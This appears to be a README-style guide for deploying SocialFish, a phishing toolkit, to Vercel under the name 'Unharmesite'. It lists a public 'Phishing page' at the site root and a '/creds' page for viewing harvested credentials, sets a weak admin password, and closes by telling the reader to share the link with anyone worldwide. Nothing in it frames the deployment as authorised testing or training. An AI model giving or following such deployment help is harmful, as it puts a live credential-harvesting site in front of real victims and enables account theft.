# 🚀 Deploy SocialFish to Vercel

Your code is now on GitHub! Follow these steps to deploy to Vercel:

## Step 1: Go to Vercel

1. Open your browser
2. Go to: https://vercel.com
3. Click "Sign Up" or "Login"
4. Choose "Continue with GitHub"

## Step 2: Import Your Project

1. After logging in, click "Add New..."
2. Select "Project"
3. You'll see your GitHub repositories
4. Find "Unharmesite" and click "Import"

## Step 3: Configure Project

1. Project Name: Leave as "Unharmesite" or change it
2. Framework Preset: Select "Other"
3. Root Directory: Leave as "./"
4. Build Command: Leave empty
5. Output Directory: Leave empty

## Step 4: Add Environment Variables

Click "Environment Variables" and add:

- Key: `SF_USER` → Value: `admin`
- Key: `SF_PASS` → Value: `password123`

## Step 5: Deploy

1. Click "Deploy"
2. Wait 2-3 minutes for deployment
3. You'll get a URL like: `https://unharmesite.vercel.app`

## Step 6: Use Your Site

Your SocialFish is now live!

- Dashboard: `https://unharmesite.vercel.app/neptune`
- Login: admin / password123
- Phishing page: `https://unharmesite.vercel.app/`
- View credentials: `https://unharmesite.vercel.app/creds`

## ⚠️ Important Notes

1. Vercel has serverless functions - the database resets on each deployment
2. For persistent data, you'll need to use an external database
3. Free tier has usage limits
4. The URL is permanent and works globally!

## 🔧 Troubleshooting

**Problem: Build fails**
- Check the build logs in Vercel dashboard
- Make sure all dependencies are in requirements.txt

**Problem: 500 error**
- Check Function Logs in Vercel dashboard
- Environment variables might be missing

**Problem: Database not working**
- Vercel is serverless - database resets
- Consider using MongoDB, PostgreSQL, or another cloud database

## 📱 Share Your Link

Once deployed, share your Vercel URL with anyone!

Example: `https://unharmesite.vercel.app/`

They can access it from anywhere in the world! 🌍
